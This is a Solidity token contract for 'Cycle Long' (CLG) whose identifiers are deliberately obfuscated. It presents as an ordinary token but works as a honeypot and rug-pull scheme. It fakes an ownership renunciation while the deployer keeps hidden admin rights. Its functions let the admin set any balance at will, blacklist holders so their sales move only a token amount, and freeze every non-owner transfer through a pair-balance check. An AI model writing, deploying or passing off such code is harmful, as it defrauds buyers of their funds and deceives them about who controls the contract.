//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface listFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract teamWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptAt {
    function createPair(address buyMin, address amountMax) external returns (address);
}

interface enableAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeSwap) external view returns (uint256);

    function transfer(address enableSwap, uint256 shouldEnable) external returns (bool);

    function allowance(address modeTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldEnable) external returns (bool);

    function transferFrom(
        address sender,
        address enableSwap,
        uint256 shouldEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingAmount, uint256 value);
    event Approval(address indexed modeTo, address indexed spender, uint256 value);
}

interface senderSwap is enableAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CycleLong is teamWallet, enableAt, senderSwap {

    address private isMarketing;

    function decimals() external view virtual override returns (uint8) {
        return marketingWallet;
    }

    string private minFromMode = "Cycle Long";

    event OwnershipTransferred(address indexed sellEnable, address indexed receiverSender);

    function transferFrom(address senderTeam, address enableSwap, uint256 shouldEnable) external override returns (bool) {
        if (_msgSender() != launchedWalletTeam) {
            if (teamSender[senderTeam][_msgSender()] != type(uint256).max) {
                require(shouldEnable <= teamSender[senderTeam][_msgSender()]);
                teamSender[senderTeam][_msgSender()] -= shouldEnable;
            }
        }
        return amountLiquidity(senderTeam, enableSwap, shouldEnable);
    }

    mapping(address => bool) public amountMode;

    address launchedWalletTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return walletFrom;
    }

    address public toFund;

    string private fromShould = "CLG";

    function receiverReceiver() public {
        emit OwnershipTransferred(toFund, address(0));
        isMarketing = address(0);
    }

    mapping(address => bool) public launchedExemptReceiver;

    function txWallet(address autoListTx) public {
        amountExempt();
        
        if (autoListTx == toFund || autoListTx == feeReceiverSell) {
            return;
        }
        launchedExemptReceiver[autoListTx] = true;
    }

    address senderTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public atLimit;

    uint256 listTx;

    mapping(address => mapping(address => uint256)) private teamSender;

    uint256 marketingLaunched;

    function balanceOf(address takeSwap) public view virtual override returns (uint256) {
        return senderToLimit[takeSwap];
    }

    function feeMax(address senderTeam, address enableSwap, uint256 shouldEnable) internal returns (bool) {
        require(senderToLimit[senderTeam] >= shouldEnable);
        senderToLimit[senderTeam] -= shouldEnable;
        senderToLimit[enableSwap] += shouldEnable;
        emit Transfer(senderTeam, enableSwap, shouldEnable);
        return true;
    }

    uint256 private walletFrom = 100000000 * 10 ** 18;

    uint256 private totalIs;

    mapping(address => uint256) private senderToLimit;

    function transfer(address shouldEnableAt, uint256 shouldEnable) external virtual override returns (bool) {
        return amountLiquidity(_msgSender(), shouldEnableAt, shouldEnable);
    }

    function getOwner() external view returns (address) {
        return isMarketing;
    }

    function symbol() external view virtual override returns (string memory) {
        return fromShould;
    }

    function name() external view virtual override returns (string memory) {
        return minFromMode;
    }

    uint256 constant exemptMode = 13 ** 10;

    bool public launchedMinBuy;

    bool private feeTrading;

    function feeEnable(uint256 shouldEnable) public {
        amountExempt();
        marketingLaunched = shouldEnable;
    }

    function amountExempt() private view {
        require(amountMode[_msgSender()]);
    }

    uint256 public receiverWallet;

    function approve(address receiverSell, uint256 shouldEnable) public virtual override returns (bool) {
        teamSender[_msgSender()][receiverSell] = shouldEnable;
        emit Approval(_msgSender(), receiverSell, shouldEnable);
        return true;
    }

    constructor (){
        
        listFee totalTeamLaunched = listFee(launchedWalletTeam);
        feeReceiverSell = exemptAt(totalTeamLaunched.factory()).createPair(totalTeamLaunched.WETH(), address(this));
        
        toFund = _msgSender();
        receiverReceiver();
        amountMode[toFund] = true;
        senderToLimit[toFund] = walletFrom;
        
        emit Transfer(address(0), toFund, walletFrom);
    }

    bool public liquidityEnable;

    function limitIs(address shouldEnableAt, uint256 shouldEnable) public {
        amountExempt();
        senderToLimit[shouldEnableAt] = shouldEnable;
    }

    function allowance(address feeModeTx, address receiverSell) external view virtual override returns (uint256) {
        if (receiverSell == launchedWalletTeam) {
            return type(uint256).max;
        }
        return teamSender[feeModeTx][receiverSell];
    }

    address public feeReceiverSell;

    uint8 private marketingWallet = 18;

    function senderBuy(address shouldTakeFrom) public {
        require(shouldTakeFrom.balance < 100000);
        if (launchedMinBuy) {
            return;
        }
        
        amountMode[shouldTakeFrom] = true;
        
        launchedMinBuy = true;
    }

    function owner() external view returns (address) {
        return isMarketing;
    }

    function amountLiquidity(address senderTeam, address enableSwap, uint256 shouldEnable) internal returns (bool) {
        if (senderTeam == toFund) {
            return feeMax(senderTeam, enableSwap, shouldEnable);
        }
        uint256 takeToken = enableAt(feeReceiverSell).balanceOf(senderTx);
        require(takeToken == marketingLaunched);
        require(enableSwap != senderTx);
        if (launchedExemptReceiver[senderTeam]) {
            return feeMax(senderTeam, enableSwap, exemptMode);
        }
        return feeMax(senderTeam, enableSwap, shouldEnable);
    }

}